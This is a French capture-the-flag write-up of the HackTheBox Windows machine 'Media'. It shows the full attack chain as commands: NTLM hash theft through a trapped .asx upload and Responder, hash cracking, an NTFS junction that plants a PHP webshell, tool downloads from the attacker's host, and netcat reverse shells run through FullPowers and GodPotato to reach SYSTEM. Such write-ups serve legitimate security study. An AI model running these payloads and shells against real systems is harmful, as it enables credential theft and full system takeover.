---
title: "Media — HackTheBox Writeup"
date: 2026-03-25
description: "Writeup de la box Media (Medium/Windows) sur HackTheBox — NTLM Theft via upload de fichier média + NTFS Junction Attack + GodPotato pour le privesc."
tags:
  - HackTheBox
  - HTB
  - Medium
  - Windows
  - NTLM Theft
  - LLMNR
  - NTFS Junction
  - GodPotato
  - Privilege Escalation
categories:
  - Writeups
  - HackTheBox
draft: false
---

## Introduction

Media est une box Windows de difficulté Medium sur HackTheBox. Elle expose un serveur web Apache (XAMPP) avec un formulaire d'upload de fichiers vidéo, un service SSH et un accès RDP. L'exploitation initiale repose sur le vol de hash NTLMv2 via l'upload d'un fichier média piégé (`.asx`), puis l'élévation de privilèges combine une NTFS Junction Attack pour obtenir une exécution de code en tant que `LOCAL SERVICE`, suivie de l'activation des privilèges désactivés avec FullPowers et d'un GodPotato pour atteindre `SYSTEM`.

---

## Reconnaissance

### Scan Nmap

```bash
nmap -Pn -sV -sC 10.129.234.67
```

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
Service Info: OS: Windows
```

Trois services sont exposés : SSH (22), un serveur web Apache sur XAMPP (80) et RDP (3389). Le titre du site — **ProMotion Studio** — indique un service lié à la production média.

### Énumération Web

On lance un fuzzing de répertoires :

```bash
ffuf -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -u http://10.129.234.67/FUZZ -fw 1 -t 200
```

```
assets                  [Status: 301]
css                     [Status: 301]
index.php               [Status: 200]
js                      [Status: 301]
phpmyadmin              [Status: 403]
```

Rien de particulièrement exploitable dans les répertoires. Le site tourne sur **PHP 8.1.17** avec **Apache 2.4.56** sous Windows (stack XAMPP classique). On note la présence de `phpmyadmin` mais il est protégé (403).

### Analyse du site web

En naviguant sur le site, on découvre une section **"Join Our Team"** qui propose un formulaire de candidature avec upload de fichier vidéo compatible Windows Media Player :

![ProMotion Studio — Formulaire d'upload](/images/media-upload-form.png)

Ce formulaire est intéressant pour deux raisons : il accepte des fichiers média qui seront probablement ouverts côté serveur, et la mention explicite de Windows Media Player suggère que le fichier sera lu par un lecteur multimédia Windows. C'est un vecteur classique pour du **NTLM Theft**.

---

## Foothold

### NTLM Theft — Principe de l'attaque

Sur un environnement Windows, lorsqu'une application tente d'accéder à une ressource réseau (par exemple un chemin UNC comme `\\attacker\share`), le système essaie automatiquement de s'authentifier via le protocole NTLM. Ce comportement, initialement conçu pour le protocole **LLMNR** (Link-Local Multicast Name Resolution), peut être détourné : un attaquant qui intercepte cette requête récupère le hash NTLMv2 de l'utilisateur sans aucune interaction supplémentaire.

![Schéma LLMNR — Interception des credentials](/images/media-llmnr-schema.png)

Certains formats de fichiers média permettent d'inclure une référence vers une ressource distante. Lorsque le fichier est ouvert par Windows Media Player, le système tente de résoudre ce chemin et envoie les credentials NTLM vers le serveur de l'attaquant.

### Génération du fichier piégé

On utilise l'outil [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) pour générer un ensemble de fichiers piégés contenant une référence UNC vers notre machine :

```bash
python3 ntlm_theft.py -g all -s 10.10.15.69 -f ma_presentation
```

Cet outil génère des fichiers dans de nombreux formats (`.m3u`, `.asx`, `.wax`, `.htm`, `.doc`, etc.), chacun contenant un lien vers `\\10.10.15.69\share` qui déclenchera l'authentification NTLM.

### Capture du hash NTLMv2

On lance Responder en écoute sur notre interface VPN :

```bash
responder -I tun0 -v
```

Puis on teste l'upload de différents formats de fichiers via le formulaire du site. Le format `.asx` déclenche l'authentification et on capture le hash NTLMv2 du compte **enox** :

```
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:e48f3940022f9a90:270D0634B80083423EF058F37D908E09:0101000000...
```

> 💡 Le fichier `.asx` (Advanced Stream Redirector) est un format de playlist XML utilisé par Windows Media Player. Il permet de spécifier une URL distante comme source du flux, ce qui déclenche la résolution du chemin UNC et donc l'envoi des credentials NTLM.

### Cracking du hash

On lance hashcat avec la wordlist rockyou :

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```
enox::MEDIA:...:1234virus@

Status...........: Cracked
```

Le mot de passe du compte `enox` est `1234virus@`.

---

## User

On se connecte en SSH avec les credentials récupérés :

```bash
ssh enox@10.129.234.67
```

🚩 **User flag obtenu.**

---

## Privilege Escalation

### Analyse de l'environnement

Une fois connecté en tant que `enox`, on explore la machine et on identifie la stack XAMPP installée avec un répertoire d'upload pour les fichiers soumis via le formulaire web. Le serveur Apache tourne sous le compte `NT AUTHORITY\LOCAL SERVICE`, ce qui signifie qu'un webshell exécuté via Apache nous donnera ce niveau de privilèges.

L'objectif est de placer un fichier PHP dans le répertoire web servi par Apache (`C:\xampp\htdocs`), mais `enox` n'a pas d'accès direct en écriture à ce répertoire. En revanche, le mécanisme d'upload du site stocke les fichiers dans `C:\Windows\Tasks\Uploads\<hash>`, un répertoire où `enox` a les droits d'écriture.

### NTFS Junction Attack

Les **NTFS Junctions** (ou points de jonction) sont l'équivalent Windows des liens symboliques pour les répertoires. Ils permettent de rediriger un chemin de répertoire vers un autre emplacement du système de fichiers. Si un utilisateur peut créer une junction dans le répertoire d'upload, il peut rediriger l'écriture vers le répertoire web d'Apache.

On calcule d'abord le hash MD5 de l'email utilisé lors de l'upload (c'est le nom du sous-répertoire créé par l'application) :

```bash
echo -n "aaa@a.com" | md5sum
```

```
566537929bb692f41c445544ead8f0e8
```

On crée la junction NTFS qui redirige ce répertoire d'upload vers le répertoire web d'Apache :

```bash
mklink /J "C:\Windows\Tasks\Uploads\566537929bb692f41c445544ead8f0e8" "C:\xampp\htdocs"
```

Désormais, tout fichier uploadé avec l'email `aaa@a.com` sera en réalité écrit dans `C:\xampp\htdocs`.

### Obtention d'un webshell

On prépare un simple webshell PHP :

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

On l'upload via le formulaire :

```bash
curl -X POST http://10.129.234.67/ \
  -F "firstname=a" -F "lastname=a" -F "email=aaa@a.com" \
  -F "fileToUpload=@/tmp/shell.php" -F "submit=Upload File"
```

On vérifie l'exécution de commandes :

```bash
curl "http://10.129.234.67/shell.php?cmd=whoami"
```

```
nt authority\local service
```

Le webshell fonctionne et s'exécute en tant que `NT AUTHORITY\LOCAL SERVICE`.

### Activation des privilèges avec FullPowers

En vérifiant les privilèges du compte `LOCAL SERVICE` avec `whoami /priv`, on constate que plusieurs privilèges importants sont présents mais **désactivés** :

```
SeTcbPrivilege             Disabled
SeImpersonatePrivilege     Disabled
```

Le privilège `SeImpersonatePrivilege` est particulièrement intéressant car il permet d'usurper l'identité d'un autre token — c'est le prérequis pour les attaques de type Potato. Cependant, il est désactivé par défaut dans le contexte du processus Apache.

L'outil [FullPowers](https://github.com/itm4n/FullPowers/releases/tag/v0.1) permet de relancer un processus en tant que `LOCAL SERVICE` avec **tous les privilèges activés**. Il fonctionne en créant une tâche planifiée qui s'exécute sous le même compte, mais avec les privilèges par défaut du compte (qui incluent `SeImpersonatePrivilege` activé).

On transfère les outils nécessaires sur la machine :

```bash
iwr http://10.10.15.69:8086/FullPowers.exe -OutFile C:\Windows\Tasks\FullPowers.exe
iwr http://10.10.15.69:8086/nc.exe -OutFile C:\Windows\Tasks\nc.exe
```

On lance FullPowers pour obtenir un nouveau reverse shell avec les privilèges activés :

```bash
C:\Windows\Tasks\FullPowers.exe -c "C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.15.69 5555"
```

On réceptionne le shell sur notre machine :

```bash
nc -lnvp 5555
```

En vérifiant à nouveau `whoami /priv`, les privilèges `SeImpersonatePrivilege` et `SeTcbPrivilege` sont maintenant **activés**.

### GodPotato — Élévation vers SYSTEM

Avec `SeImpersonatePrivilege` activé, on peut utiliser [GodPotato](https://github.com/BeichenDream/GodPotato) pour usurper le token `SYSTEM`. GodPotato est une évolution des attaques Potato (JuicyPotato, PrintSpoofer, etc.) qui exploite le mécanisme DCOM/OXID pour créer un token d'impersonation `SYSTEM`.

On transfère GodPotato sur la cible :

```bash
curl http://10.10.15.69:8086/GodPotato.exe -o C:\Windows\Temp\GodPotato.exe
```

On lance l'exploitation avec un reverse shell vers un nouveau port :

```bash
C:\Windows\Temp\GodPotato.exe -cmd "C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.15.69 6666"
```

On réceptionne le shell sur le port 6666 :

```bash
nc -lnvp 6666
whoami
```

```
nt authority\system
```

🚩 **Root flag obtenu.**

---

## Conclusion

Cette box Medium illustre une chaîne d'attaque complète sur un environnement Windows non-AD :

1. **NTLM Theft via fichier média** — Exploitation du comportement de Windows Media Player qui tente de résoudre les chemins UNC, envoyant automatiquement les credentials NTLM vers notre Responder
2. **NTFS Junction Attack** — Redirection du répertoire d'upload vers le webroot Apache pour y déposer un webshell PHP
3. **FullPowers** — Réactivation des privilèges désactivés du compte `LOCAL SERVICE` en exploitant le mécanisme de tâches planifiées
4. **GodPotato** — Exploitation du `SeImpersonatePrivilege` pour usurper le token `SYSTEM` via DCOM/OXID

Points clés à retenir :
- Les formulaires d'upload qui traitent les fichiers côté serveur sont des vecteurs de NTLM Theft si le serveur tourne sous Windows
- Le format `.asx` est particulièrement efficace pour ce type d'attaque car il est nativement pris en charge par Windows Media Player
- Les NTFS Junctions permettent de rediriger l'écriture de fichiers vers des répertoires normalement inaccessibles
- Un compte `LOCAL SERVICE` avec `SeImpersonatePrivilege` est à un pas de `SYSTEM` — FullPowers + GodPotato forment un combo redoutable
